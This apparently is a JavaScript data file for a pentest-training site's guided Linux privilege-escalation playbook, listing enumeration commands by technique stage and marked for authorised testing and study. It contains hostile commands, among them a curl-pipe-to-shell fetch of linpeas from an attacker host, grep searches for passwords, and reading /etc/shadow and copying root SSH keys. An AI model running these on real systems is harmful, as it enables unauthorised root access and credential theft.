/*
  LINUX PRIVILEGE ESCALATION MAP — data for linux-privesc-map.html

  A guided playbook (same engine as the AD / Cloud maps): colour-coded stages
  you expand, each holding technique buttons with enumeration commands, theory
  links, outcome badges and "Move to" pivots. Enumeration-focused; cracking and
  weaponisation live in the linked theory pages.

  Rendered by assets/js/privmap-main.js (reads window.PRIVMAP_DATA).
*/
window.PRIVMAP_DATA = {
  meta: {
    title: "Linux Privilege Escalation — Guided Playbook",
    version: "v1",
    note: "For authorised testing and study only. Expand a stage, pick a technique, follow the pivots to root."
  },
  palette: { slate: "#94a3b8", blue: "#3b9ee5", amber: "#f59e0b", violet: "#a78bfa", green: "#4ade80" },
  sections: [
    {
      id: "foothold", title: "Low-Privileged Shell", color: "#94a3b8", tag: "Start here",
      desc: "You have a shell as a normal user or a service account. Enumerate first — privesc is an enumeration problem.",
      techniques: [
        { id: "enum", title: "Automated + manual enumeration",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          vuln: { label: "Operator Cheatsheet", url: "cheatsheet.html" },
          desc: "Run an enumerator and the key manual checks; everything below branches from what they surface.",
          cmds: ["id; sudo -l", "find / -perm -4000 -type f 2>/dev/null", "getcap -r / 2>/dev/null",
                 "cat /etc/crontab; ls -la /etc/cron.*", "uname -a; cat /etc/os-release",
                 "curl http://LHOST:8000/linpeas.sh | sh"],
          outcomes: [{ label: "Enumeration done", color: "#94a3b8" }],
          moveTo: [
            { section: "sudo", note: "if sudo -l shows allowed commands" },
            { section: "suid-caps", note: "if there are unusual SUID bins / capabilities" },
            { section: "cron-path", note: "if cron jobs or writable PATH entries exist" },
            { section: "creds", note: "if you find keys/passwords lying around" }
          ] }
      ]
    },
    {
      id: "sudo", title: "Sudo Rule Abuse", color: "#3b9ee5", tag: "sudo -l",
      desc: "An allowed sudo command is frequently a direct path to root via a known shell-escape.",
      techniques: [
        { id: "gtfobins", title: "GTFOBins shell escape",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          vuln: { label: "LOLBAS & GTFOBins", url: "lolbas.html" },
          desc: "Many binaries can spawn a shell; if one is allowed via sudo, it runs that shell as root. Cross-check each allowed command against GTFOBins.",
          cmds: ["sudo -l", "# then look up the allowed binary on GTFOBins (Sudo)"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "shell-escape yields a root shell" }] },
        { id: "env", title: "Environment / LD_PRELOAD",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "env_keep / env_reset weaknesses (e.g. LD_PRELOAD, LD_LIBRARY_PATH preserved) let a preloaded library run in the sudo'd process.",
          cmds: ["sudo -l   # look for env_keep+=LD_PRELOAD or SETENV"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "preload runs as root" }] }
      ]
    },
    {
      id: "suid-caps", title: "SUID Binaries & Capabilities", color: "#3b9ee5", tag: "setuid / caps",
      desc: "A setuid-root binary or a file capability that can read/write/exec is a privesc primitive.",
      techniques: [
        { id: "suid", title: "SUID binary abuse",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          vuln: { label: "LOLBAS & GTFOBins", url: "lolbas.html" },
          desc: "A setuid-root binary runs as root; if it can spawn a shell, read, or write, GTFOBins (SUID) shows the escape.",
          cmds: ["find / -perm -4000 -type f 2>/dev/null", "# check each against GTFOBins (SUID)"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "SUID escape → root" }] },
        { id: "caps", title: "File capabilities",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Capabilities like cap_setuid on an interpreter give root without the SUID bit. Enumerate and look up the capability.",
          cmds: ["getcap -r / 2>/dev/null   # e.g. python cap_setuid+ep"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "capability → root" }] }
      ]
    },
    {
      id: "cron-path", title: "Cron, PATH & Writable Scripts", color: "#f59e0b", tag: "scheduled",
      desc: "A root-run job that executes something you can modify — a writable script, a relative PATH, or a wildcard — runs your code as root.",
      techniques: [
        { id: "writable-cron", title: "Writable cron script",
          theory: { label: "Linux Persistence", url: "theory/2026-10-09-linux-persistence.html" },
          desc: "A cron job owned by root that runs a script a lower-privileged user can write.",
          cmds: ["cat /etc/crontab; ls -la /etc/cron.d /etc/cron.*", "find / -writable -type f 2>/dev/null | grep -v /proc"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "the job runs your code as root" }] },
        { id: "path-wildcard", title: "Relative PATH / wildcard injection",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "A root job calling a command without an absolute path, or using a wildcard (tar/chown), can be hijacked by planting files in the working directory.",
          cmds: ["# inspect the job's command; plant a binary/arg-file it will pick up"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "hijacked command runs as root" }] }
      ]
    },
    {
      id: "writable", title: "Writable Sensitive Files", color: "#f59e0b", tag: "ACLs",
      desc: "World/second-user-writable system files are direct escalations.",
      techniques: [
        { id: "passwd-shadow", title: "Writable /etc/passwd or readable /etc/shadow",
          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
          desc: "Writable /etc/passwd lets you add a root-uid user with a known hash; readable /etc/shadow hands you crackable root hashes.",
          cmds: ["ls -l /etc/passwd /etc/shadow", "# if shadow is readable: crack offline (see Password Cracking)"],
          outcomes: [{ label: "root", color: "#4ade80" }, { label: "hash to crack", color: "#f59e0b" }],
          moveTo: [{ section: "root", note: "add a uid-0 user / crack root" }] },
        { id: "service-units", title: "Writable service / unit files",
          theory: { label: "Linux Persistence", url: "theory/2026-10-09-linux-persistence.html" },
          desc: "A writable systemd unit or init script executed by root runs your command on (re)start.",
          cmds: ["find /etc/systemd /lib/systemd -writable 2>/dev/null"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "unit runs as root" }] }
      ]
    },
    {
      id: "creds", title: "Credential Reuse", color: "#a78bfa", tag: "loot",
      desc: "Harvested passwords and SSH keys often escalate directly or move you to a more privileged account/host.",
      techniques: [
        { id: "keys", title: "SSH keys & stored passwords",
          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
          vuln: { label: "Linux Lateral Movement & SSH", url: "theory/2026-10-15-linux-lateral-movement-and-ssh.html" },
          desc: "Keys in ~/.ssh, passwords in configs/history/.env often belong to root or another admin. Try them with su / ssh.",
          cmds: ["ls -la ~/.ssh /home/*/.ssh 2>/dev/null", "grep -RniE 'password|secret' /var/www /opt /home 2>/dev/null | head",
                 "cat ~/.bash_history"],
          outcomes: [{ label: "root", color: "#4ade80" }, { label: "other user", color: "#a78bfa" }],
          moveTo: [{ section: "root", note: "reuse creds to become root" }] }
      ]
    },
    {
      id: "kernel", title: "Kernel & Component Exploits", color: "#3b9ee5", tag: "CVE",
      desc: "When config routes are exhausted, a kernel or setuid-component CVE may apply — check the version carefully to avoid crashes.",
      techniques: [
        { id: "kernel-cve", title: "Kernel / pkexec / component CVEs",
          theory: { label: "Linux Privilege Escalation", url: "theory/2026-10-09-linux-privilege-escalation.html" },
          desc: "Match kernel and key packages to known local-root CVEs (e.g. DirtyPipe, pwnkit-class pkexec). Verify applicability before running anything.",
          cmds: ["uname -r; cat /etc/os-release", "# map version to a known local-root CVE; confirm before use"],
          outcomes: [{ label: "root", color: "#4ade80" }],
          moveTo: [{ section: "root", note: "exploit yields root" }] }
      ]
    },
    {
      id: "root", title: "root", color: "#4ade80", tag: "You own it",
      desc: "You have root. Loot credentials, establish persistence, and pivot.",
      techniques: [
        { id: "post", title: "Post-root actions",
          theory: { label: "Linux Persistence", url: "theory/2026-10-09-linux-persistence.html" },
          vuln: { label: "Linux Lateral Movement & SSH", url: "theory/2026-10-15-linux-lateral-movement-and-ssh.html" },
          desc: "Dump /etc/shadow, harvest keys and configs, set up persistence, and move laterally to the next host.",
          cmds: ["cat /etc/shadow", "cp /root/.ssh/id_* .  # and other users' keys", "# then: persistence + lateral movement"],
          outcomes: [{ label: "domain/fleet pivot", color: "#4ade80" }],
          moveTo: [{ section: "creds", note: "reuse the new secrets to reach more hosts" }] }
      ]
    }
  ]
};
